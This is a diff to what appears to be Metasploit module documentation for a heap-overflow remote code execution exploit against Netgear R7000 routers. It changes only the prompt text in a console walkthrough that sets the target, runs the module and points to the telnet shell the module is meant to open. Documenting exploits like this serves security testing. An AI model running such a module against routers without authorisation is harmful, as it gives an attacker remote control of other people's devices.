@@ -30,10 +30,10 @@ Netgear R7000 routers running firmware version `1.0.11.116` and earlier.
 
 ### Netgear R7000 with Firmware Version 1.0.11.116
 ```
-msf6 > use auxiliary/admin/http/netgear_r7000_backup_cgi_heap_overflow_rce
-msf6 auxiliary(admin/http/netgear_r7000_backup_cgi_heap_overflow_rce) > set RHOSTS 192.168.1.1
+msf > use auxiliary/admin/http/netgear_r7000_backup_cgi_heap_overflow_rce
+msf auxiliary(admin/http/netgear_r7000_backup_cgi_heap_overflow_rce) > set RHOSTS 192.168.1.1
 RHOSTS => 192.168.1.1
-msf6 auxiliary(admin/http/netgear_r7000_backup_cgi_heap_overflow_rce) > show options
+msf auxiliary(admin/http/netgear_r7000_backup_cgi_heap_overflow_rce) > show options
 
 Module options (auxiliary/admin/http/netgear_r7000_backup_cgi_heap_overflow_rce):
 
@@ -45,7 +45,7 @@ Module options (auxiliary/admin/http/netgear_r7000_backup_cgi_heap_overflow_rce)
    SSL      false            no        Negotiate SSL/TLS for outgoing connections
    VHOST                     no        HTTP server virtual host
 
-msf6 auxiliary(admin/http/netgear_r7000_backup_cgi_heap_overflow_rce) > run
+msf auxiliary(admin/http/netgear_r7000_backup_cgi_heap_overflow_rce) > run
 [*] Running module against 192.168.1.1
 
 [*] Executing automatic check (disable AutoCheck to override)
@@ -54,7 +54,7 @@ msf6 auxiliary(admin/http/netgear_r7000_backup_cgi_heap_overflow_rce) > run
 [*] Sending 10th and final packet...
 [*] If the exploit succeeds, you should be able to connect to the telnet shell by running: telnet 192.168.1.1
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/http/netgear_r7000_backup_cgi_heap_overflow_rce) >
+msf auxiliary(admin/http/netgear_r7000_backup_cgi_heap_overflow_rce) >
 ```
 
 And in a separate terminal shell:
